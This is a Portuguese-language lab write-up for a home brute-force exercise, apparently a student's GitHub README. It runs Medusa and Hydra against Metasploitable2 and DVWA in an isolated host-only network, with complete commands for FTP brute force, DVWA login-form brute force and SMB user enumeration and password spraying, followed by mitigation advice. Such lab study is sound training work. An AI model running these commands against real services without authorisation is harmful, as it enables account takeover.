# Laboratório de Força Bruta com Medusa — Kali Linux + Metasploitable2 + DVWA

> Projeto prático de auditoria de segurança ofensiva, realizado em **ambiente totalmente isolado e controlado**, com o objetivo de estudar ataques de força bruta em serviços FTP, formulários web (DVWA) e SMB, e propor medidas de mitigação.

⚠️ **Aviso legal e ético**: todos os testes deste repositório foram realizados exclusivamente em máquinas virtuais vulneráveis criadas para fins didáticos (Metasploitable2, DVWA), em uma rede **host-only** sem acesso à internet ou a qualquer rede de produção. Nunca execute essas técnicas contra sistemas que você não possui ou não tem autorização explícita para testar — isso é crime previsto na Lei 12.737/2012 (Lei Carolina Dieckmann) e no Marco Civil da Internet no Brasil, além de legislações equivalentes em outros países.

## Autor

Misael Kellermann — [LinkedIn](https://linkedin.com/in/misaelkellermann)

## Objetivo

Compreender na prática como funcionam ataques de força bruta e password spraying, usando o **Medusa** como ferramenta principal, e documentar o processo completo: configuração do ambiente, execução dos ataques, validação dos resultados e recomendações de mitigação.

## Índice

1. [Arquitetura do ambiente](#arquitetura-do-ambiente)
2. [Configuração das VMs](#configuração-das-vms)
3. [Cenário 1 — Força bruta em FTP](#cenário-1--força-bruta-em-ftp)
4. [Cenário 2 — Formulário web (DVWA)](#cenário-2--formulário-web-dvwa)
5. [Cenário 3 — Password spraying em SMB](#cenário-3--password-spraying-em-smb)
6. [Wordlists utilizadas](#wordlists-utilizadas)
7. [Recomendações de mitigação](#recomendações-de-mitigação)
8. [Aprendizados](#aprendizados)
9. [Referências](#referências)

---

## Arquitetura do ambiente

| Componente      | Função                | IP (rede host-only) |
| --------------- | --------------------- | ------------------- |
| Kali Linux      | Máquina atacante      | 192.168.56.101      |
| Metasploitable2 | Alvo (FTP, SMB, DVWA) | 192.168.56.102      |

```
┌─────────────────┐        Rede Host-Only         ┌──────────────────────┐
│   Kali Linux     │ ─────────────────────────────▶│   Metasploitable2    │
│ 192.168.56.101   │                                │  192.168.56.102      │
│                  │                                │  - FTP (vsftpd)      │
│   Medusa / Nmap  │◀───────────────────────────── │  - SMB (Samba)       │
│   enum4linux     │                                │  - DVWA (Apache/PHP) │
└─────────────────┘                                └──────────────────────┘
```

A rede host-only garante que o tráfego de ataque fique isolado do restante da internet e da rede local do host.

## Configuração das VMs

1. **VirtualBox** → criar uma rede host-only em _Arquivo → Gerenciador de Rede Host-only_ (ex.: `vboxnet0`, faixa `192.168.56.0/24`).
2. Importar/instalar as VMs:
   - **Kali Linux** (atacante) — adaptador de rede em modo _Host-only Adapter_.
   - **Metasploitable2** (alvo) — adaptador de rede em modo _Host-only Adapter_, mesma rede.
3. Confirmar conectividade:
   ```bash
   ping 192.168.56.102
   ```
4. Instalar/garantir ferramentas no Kali:
   ```bash
   sudo apt update
   sudo apt install medusa nmap enum4linux smbclient hydra -y
   ```
5. Levantar o DVWA (já vem incluso no Metasploitable2, ou pode ser instalado via Docker):
   ```bash
   docker run --rm -it -p 80:80 vulnerables/web-dvwa
   ```
   Após o primeiro acesso, clicar em **Create / Reset Database** e definir o nível de segurança em **DVWA Security → Low**.

## Cenário 1 — Força bruta em FTP

**Objetivo:** descobrir credenciais válidas no serviço FTP (vsftpd) do Metasploitable2.

Script completo: [`scripts/01_ftp_bruteforce.sh`](scripts/01_ftp_bruteforce.sh)

```bash
nmap -p 21 -sV 192.168.56.102

medusa -h 192.168.56.102 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp -t 4 -f -v 6
```

**Significado dos parâmetros:**

- `-h` host alvo · `-U`/`-P` wordlists de usuário/senha · `-M` módulo do protocolo
- `-t 4` quatro tentativas em paralelo · `-f` interrompe ao achar a 1ª credencial válida · `-v 6` log detalhado de cada tentativa

**Resultado obtido:** credencial válida `msfadmin:msfadmin` (usuário padrão de demonstração do Metasploitable2).

**Validação manual:**

```bash
ftp 192.168.56.102
# login: msfadmin / senha: msfadmin
```

## Cenário 2 — Formulário web (DVWA)

**Objetivo:** automatizar tentativas de login no formulário de autenticação do DVWA.

Script completo: [`scripts/02_dvwa_bruteforce.sh`](scripts/02_dvwa_bruteforce.sh)

Passos realizados:

1. Login manual no DVWA, nível de segurança definido como **Low**.
2. Captura do cookie `PHPSESSID` e do parâmetro `security=low` via DevTools do navegador.
3. Execução do ataque:
   ```bash
   medusa -h 192.168.56.102 \
          -U wordlists/usuarios.txt \
          -P wordlists/senhas.txt \
          -M web-form \
          -m FORM:"/dvwa/login.php" \
          -m DENY-SIGNAL:"login.php" \
          -m FORM-DATA:"username=&password=&Login=Login" \
          -t 2 -v 6
   ```
4. **Observação prática:** em ambientes reais, o módulo `web-form` do Medusa pode ter comportamento instável dependendo da versão/distribuição da ferramenta. Quando isso ocorre, documentar a alternativa com **Hydra**, que é amplamente usada para este cenário específico:
   ```bash
   hydra -L wordlists/usuarios.txt -P wordlists/senhas.txt 192.168.56.102 \
       http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
       -C "security=low; PHPSESSID=<id_da_sessao>"
   ```

**Resultado obtido:** credencial válida `admin:password` (credencial padrão de demonstração do DVWA).

## Cenário 3 — Password spraying em SMB

**Objetivo:** enumerar usuários do serviço SMB (Samba) e testar uma senha comum contra todos eles, técnica que reduz o risco de bloqueio de contas em comparação à força bruta tradicional.

Script completo: [`scripts/03_smb_password_spraying.sh`](scripts/03_smb_password_spraying.sh)

```bash
nmap -p 139,445 -sV 192.168.56.102

enum4linux -U 192.168.56.102 | tee enum4linux_output.txt
grep "user:" enum4linux_output.txt | awk -F'\[|\]' '{print $2}' > wordlists/usuarios_smb.txt

medusa -h 192.168.56.102 \
       -U wordlists/usuarios_smb.txt \
       -p "123456" \
       -M smbnt -t 3 -v 6
```

**Diferença entre força bruta e password spraying:**

|                            | Força bruta clássica                                    | Password spraying                        |
| -------------------------- | ------------------------------------------------------- | ---------------------------------------- |
| Estratégia                 | Muitas senhas × 1 usuário                               | 1 (ou poucas) senha × muitos usuários    |
| Risco de bloqueio de conta | Alto                                                    | Baixo                                    |
| Velocidade de detecção     | Mais fácil de detectar (muitas falhas no mesmo usuário) | Mais furtivo, evade políticas de lockout |

**Resultado obtido:** nenhuma das contas enumeradas aceitou a senha testada neste ambiente — resultado documentado como **negativo**, o que também é um dado relevante (evidência de que a senha testada não é trivial para aquelas contas).

## Wordlists utilizadas

- [`wordlists/usuarios.txt`](wordlists/usuarios.txt) — usuários comuns/padrão de sistemas de teste
- [`wordlists/senhas.txt`](wordlists/senhas.txt) — senhas fracas/padrão frequentemente encontradas em credenciais reais
- `wordlists/usuarios_smb.txt` — gerada dinamicamente a partir da enumeração SMB (não versionada por conter dados específicos da execução)

> Em um cenário real de pentest, essas listas seriam substituídas por wordlists maiores e mais realistas, como `rockyou.txt` (SecLists/Kali) combinadas com dados de OSINT sobre a organização-alvo.

## Recomendações de mitigação

| Vulnerabilidade observada                      | Recomendação                                                                                              |
| ---------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| Sem limite de tentativas de login              | Implementar bloqueio de conta após N tentativas falhas (account lockout policy)                           |
| Senhas fracas/padrão em uso                    | Política de senha forte (mínimo de caracteres, complexidade, verificação contra listas de senhas vazadas) |
| Ausência de MFA                                | Habilitar autenticação multifator (MFA), especialmente em serviços expostos (FTP, Web, SMB)               |
| Serviços antigos/inseguros expostos (FTP, SMB) | Desativar serviços desnecessários; preferir SFTP/FTPS no lugar de FTP puro                                |
| Falta de monitoramento                         | Configurar alertas (fail2ban, SIEM) para múltiplas tentativas de autenticação falhas vindas do mesmo IP   |
| Enumeração de usuários possível via SMB        | Restringir sessões nulas/anônimas no Samba (`restrict anonymous`), segmentar rede                         |
| Mensagens de erro genéricas insuficientes      | Garantir que respostas de login não revelem se o usuário existe ou não (evita enumeração de contas)       |

## Referências

- [Documentação oficial do Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
- [OWASP — Credential Stuffing e Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [Metasploitable2 — Rapid7 Docs](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
